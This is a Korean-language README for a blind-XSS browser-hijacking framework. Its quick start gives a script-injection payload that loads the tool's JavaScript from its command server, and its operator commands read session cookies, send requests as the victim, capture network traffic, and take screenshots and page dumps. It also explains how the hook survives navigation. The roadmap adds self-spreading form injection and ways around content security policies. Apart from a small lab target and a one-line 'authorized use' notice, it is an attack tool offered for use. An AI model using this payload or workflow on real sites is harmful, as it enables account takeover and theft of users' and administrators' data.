# BXShell v0.3 — blind XSS 상주형 브라우저 제어 프레임워크

blind XSS로 확보한 관리자 브라우저 세션에 **상주(beacon)** 해서 DevTools 콘솔처럼 조작하는 도구.
앵커(self-iframe)로 내비게이션 이탈에도 세션을 유지하고, 명령 큐는 서버 보존이라 세션이 끊겨도 유실되지 않는다.

```
[관리자 브라우저]                              [C2 :9000]                 [운영자]
저장된 싱크 렌더 → bx.js 실행 ── info/bead ──▶ /b/* 수집 ──▶ /op 콘솔 표시
     ▲ EventSource(명령 푸시) ◀────────────── /sse  ◀── /api/send (명령 큐잉)
     └─ eval 실행 → 결과 sendBeacon ─────────▶ /b/result
지속성: XFO 사전검사 → self-iframe 앵커 / DENY면 소프트 내비게이션 하이재킹
```

## 빠른 시작

```bash
# 1) C2 기동
python3 c2/server.py                # :7700 (BX_C2_PORT 로 조정)

# 2) 실습 대상 기동 (별도 터미널)
python3 lab/target.py               # :8000

# 3) 주입 — http://127.0.0.1:8000/ 의 폼에 입력:
<script src="http://127.0.0.1:7700/bx.js"></script>

# 4) 피해자 시뮬레이션 — 새 창에서 http://127.0.0.1:8000/admin 열람 (raw 렌더 → 발동)

# 5a) 웹 운영자 — http://127.0.0.1:7700/op
document.title
await bx.proxy('/profile')          # 피해자 세션으로 내부 URL 요청
bx.dom.text('h1')                   # DOM 쿼리
frames[0].document.title            # 앵커 상태: iframe 내부 페이지 접근

# 5b) CLI 운영자 (별도 터미널)
python3 c2/cli.py
# bx[?] › ls            → 피해자 목록
# bx[?] › sel 0         → 첫 번째 피해자 선택
# bx[abc123] › net      → 네트워크 캡처 보기
# bx[abc123] › proxy /admin/api/users
# bx[abc123] › document.cookie
```

## 용어·설계

- **채널 이중화**: SSE(푸시) + 폴링 폴백 동시 운용, 명령 `cid`로 중복 제거
- **명령 큐 보존**: 피해자가 이탈해도 큐는 서버에 남고, 다음 트리거 때 실행
- **앵커**: XFO 사전검사 후 self-iframe 재배치 — 최상위 프레임이 컨트롤러로 생존, iframe 내부 전 페이지 관찰 가능. DENY면 하이재킹으로 폴백
- **컨텍스트 유지**: `window.__bx` 오브젝트가 명령 간 살아있음 (변수 보관 가능)
- **피해자 실제 문서**: `bx.doc()` — anchor 모드에서 top은 껍데기이므로 `frames[0]`(동일 출처)를 해석. 스크린샷(`bx.shot()`)·HTML 덤프(`bx.htmldump()`)는 전부 이 문서 기준 — 껍데기가 아닌 피해자가 보는 화면을 캡처

## 세션 워크스페이스 (sessions/)

피해자가 연결되면 세션 디렉터리가 생성되고 모든 수집물이 파일로 기록된다. 재시작 시 자동 복원.

```
sessions/
├─ .purged.json          # 완전파기된 vid 인덱스 — 재등록 영구 차단(고스트 방지)
├─ {vid}/
│  ├─ meta.json          # 신원/상태 (first·last·url·bn·mode·ua·name, closed)
│  ├─ commands.jsonl     # push 시점부터 기록 — 재시작 시 in-flight 명령도 재큐
│  ├─ console.jsonl      # 피해자 console.* / onerror 캡처
│  ├─ net.jsonl          # fetch/XHR 훅 캡처
│  ├─ pageinfo.json      # 첫 연결 자동수집
│  ├─ htmldump.html      # DOM 스냅샷 (청크 조립본)
│  └─ screenshot.jpg     # 화면 스냅샷 (바이너리)
└─ .trash/{vid}/         # Delete → 이동(soft). Restore 또는 Purge
```

- **Delete**(soft) = `.trash/` 이동, 웹에서 숨김, 같은 vid 재비컨 무시
- **Restore** = `.trash/` → 복귀 (웹 Sessions 탭의 TRASH 영역)
- **Purge**(hard) = 디렉터리 영구 삭제 + `.purged.json` 기록 + evidence 원장에 `session_delete`/`session_purge` 이벤트 기록
- `evidence/sessions-YYYYMMDD.jsonl`은 별도 append-only 원장 (beat 제외 전 비컨)

## 운영자 콘솔 (/op)

- **상태 점**: 🟢 live(≤5s) → 🟡 stale(≤35s, 비컨 지연) → 🔴 red(>35s & SSE 없음 = 완전 끊김) / ⚪ closed
- **탭 ✕** = 콘솔에서만 숨김(세션 생존), Sessions 패널 클릭으로 복원
- **`/screenshot`** — 피해자 화면 썸네일 출력, 클릭 시 라이트박스 확대
- **`/html`** — 실제 페이지 덤프 링크, 클릭 시 새 탭에서 페이지 뷰
- **`/proxy <url>`** — 피해자 세션으로 내부 요청

## 증거

모든 비컨(beat 제외)은 `evidence/sessions-YYYYMMDD.jsonl` 에 JSONL 누적 — 원장(result/ledger.md) 연계용.
세션 삭제/파기 이벤트도 원장에 기록된다.

## 로드맵

- ~~v0.2: 브라우저 프록시(fetch 대행+청크), fetch/XHR 훅, 운영자 CLI 리플~~ ✔ 완료
- ~~v0.3: 자동수집(pageinfo·HTML 덤프·스크린샷 청크), 세션 워크스페이스 영속화, 휴지통(restore/purge)~~ ✔ 완료
- v0.4: 싱크 확산(폼 자동 주입), CSP별 폴백 자동화, 다중 피해자 태깅, 운영자 인증(토큰), 알림(Telegram), 교차 출처 iframe 캡처(CDP 연동)

## 주의

**승인된 대상에만 사용.** 수집 데이터(쿠키·localStorage·스크린샷)는 민감할 수 있으므로 evidence 보호 필수. 세션 삭제는 soft(휴지통), 파기는 영구 삭제다.
